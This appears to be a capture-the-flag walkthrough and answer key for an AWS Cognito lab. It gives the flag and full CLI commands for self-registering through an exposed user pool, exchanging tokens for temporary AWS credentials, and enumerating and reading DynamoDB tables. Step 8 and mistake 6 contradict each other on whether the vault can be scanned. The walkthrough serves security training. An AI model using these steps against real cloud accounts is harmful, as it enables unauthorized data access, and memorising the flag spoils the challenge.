# Challenge 4: Hive Mind - Walkthrough

**Flag:** `HiveCTF{c0gn1t0_cr3d_v3nd1ng_m4ch1n3}`

## Overview

This challenge requires students to:
1. Discover Cognito configuration in a website's source code
2. Sign up and authenticate via AWS CLI
3. Exchange Cognito tokens for temporary AWS credentials
4. Enumerate DynamoDB tables and follow a breadcrumb trail to the flag

## Step-by-Step Walkthrough

### Step 1: Inspect the Website Source

Visit the portal URL and view the page source (Ctrl+U or right-click > View Source).

In the JavaScript, you'll find:

```
const COGNITO_USER_POOL_ID = "us-east-1_XXXXXXX";
const COGNITO_CLIENT_ID = "XXXXXXXXXXXXXXXXXXXXXXXX";
const COGNITO_IDENTITY_POOL_ID = "us-east-1:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX";
const COGNITO_REGION = "us-east-1";
```

The page also reveals the Identity Provider string in the `IDP_PROVIDER` variable.

### Step 2: Sign Up for an Account

Use the discovered Client ID to register a new user. The pre-signup Lambda trigger auto-confirms users, so no email verification is needed.

```bash
aws cognito-idp sign-up \
  --client-id <COGNITO_CLIENT_ID> \
  --username player@example.com \
  --password 'P@ssw0rd123!' \
  --no-sign-request \
  --region us-east-1
```

Expected output:
```json
{
    "UserConfirmed": true,
    "UserSub": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

### Step 3: Authenticate and Get Tokens

```bash
aws cognito-idp initiate-auth \
  --client-id <COGNITO_CLIENT_ID> \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=player@example.com,PASSWORD='P@ssw0rd123!' \
  --no-sign-request
```

Save the `IdToken` from `AuthenticationResult`.

### Step 4: Get an Identity ID from the Identity Pool

```bash
aws cognito-identity get-id \
  --identity-pool-id <COGNITO_IDENTITY_POOL_ID> \
  --logins "cognito-idp.us-east-1.amazonaws.com/<COGNITO_USER_POOL_ID>=<ID_TOKEN>" \
  --no-sign-request
```

Save the returned `IdentityId`.

### Step 5: Exchange for AWS Credentials

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id <IDENTITY_ID> \
  --logins "cognito-idp.us-east-1.amazonaws.com/<COGNITO_USER_POOL_ID>=<ID_TOKEN>" \
  --no-sign-request
```

This returns temporary `AccessKeyId`, `SecretKey`, and `SessionToken`.

### Step 6: Configure AWS CLI with Temporary Credentials

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretKey>
export AWS_SESSION_TOKEN=<SessionToken>
export AWS_DEFAULT_REGION=us-east-1
```

Verify access:
```bash
aws sts get-caller-identity
```

#### Discover Your Permissions

Check what the authenticated role can do:

```bash
aws iam list-role-policies --role-name hivectf-ch4-authenticated-role
```

This shows two inline policies. Read the interesting one:

```bash
aws iam get-role-policy --role-name hivectf-ch4-authenticated-role --policy-name hivectf-ch4-dynamodb-read
```

The policy reveals two key details:
- **Scan/Query/GetItem** on `hivectf-ch4-users`, `hivectf-ch4-research-logs`, and `hivectf-ch4-admin-notes`
- **GetItem only** on `hivectf-ch4-vault` (no Scan!)

This means you can freely browse the first three tables, but the vault table requires you to know the exact key. You'll need to find it somewhere in the other tables.

### Step 7: Enumerate DynamoDB Tables

```bash
aws dynamodb list-tables
```

Output reveals tables:
- `hivectf-ch4-admin-notes`
- `hivectf-ch4-research-logs`
- `hivectf-ch4-users`
- `hivectf-ch4-vault`

### Step 8: Explore Tables for Clues

Scan the tables you have full access to. Note that scanning `hivectf-ch4-vault` will
fail with `AccessDeniedException` -- you can only `GetItem` on it with the correct key.

```bash
aws dynamodb scan --table-name hivectf-ch4-users
aws dynamodb scan --table-name hivectf-ch4-research-logs
aws dynamodb scan --table-name hivectf-ch4-admin-notes

# This will FAIL:
aws dynamodb scan --table-name hivectf-ch4-vault
# AccessDeniedException - Scan not allowed on vault table
```

The `hivectf-ch4-research-logs` table has a classified entry (LOG-2025-0146) that
mentions "Project Honeycomb" and references admin notes for vault access procedures.

The `hivectf-ch4-admin-notes` table contains an item with `note_id = CLASSIFIED-001`:

```json
{
    "note_id": {"S": "CLASSIFIED-001"},
    "author": {"S": "dr.queen@hivemind.io"},
    "classification": {"S": "TOP SECRET"},
    "content": {"S": "The primary research vault has been secured. Access requires the vault key."},
    "vault_key": {"S": "QUEEN-BEE-ALPHA"},
    "hint": {"S": "Use this key to query the vault table. The key is the partition key value."}
}
```

### Step 9: Query the Vault

Use the discovered vault key with `get-item` (the only operation allowed on this table):

```bash
aws dynamodb get-item \
  --table-name hivectf-ch4-vault \
  --key '{"vault_key": {"S": "QUEEN-BEE-ALPHA"}}'
```

### Step 10: Retrieve the Flag

The response contains:

```json
{
    "Item": {
        "vault_key": {"S": "QUEEN-BEE-ALPHA"},
        "classification": {"S": "EYES ONLY"},
        "project": {"S": "Project Honeycomb"},
        "flag": {"S": "HiveCTF{c0gn1t0_cr3d_v3nd1ng_m4ch1n3}"},
        "note": {"S": "Congratulations. You've accessed the queen's private vault."}
    }
}
```

**Flag: `HiveCTF{c0gn1t0_cr3d_v3nd1ng_m4ch1n3}`**

## Key Concepts Tested

- **Client-side information disclosure**: Cognito IDs exposed in JavaScript source
- **Cognito self-registration abuse**: Open user pool signup with auto-confirmation
- **Token exchange**: Cognito ID token to AWS temporary credentials via Identity Pool
- **Cloud enumeration**: Using AWS CLI to discover and query DynamoDB tables
- **Breadcrumb following**: Reading through data to find the next step in the trail

## Common Mistakes

1. Trying to use the web form instead of the AWS CLI
2. Not saving the IdToken (it's needed multiple times)
3. Forgetting `--no-sign-request` on Cognito commands
4. Not setting the session token when configuring credentials
5. Scanning only the first table and missing the breadcrumb in admin-notes
6. Trying to scan the vault table (it works, but the key approach is what the hint suggests)
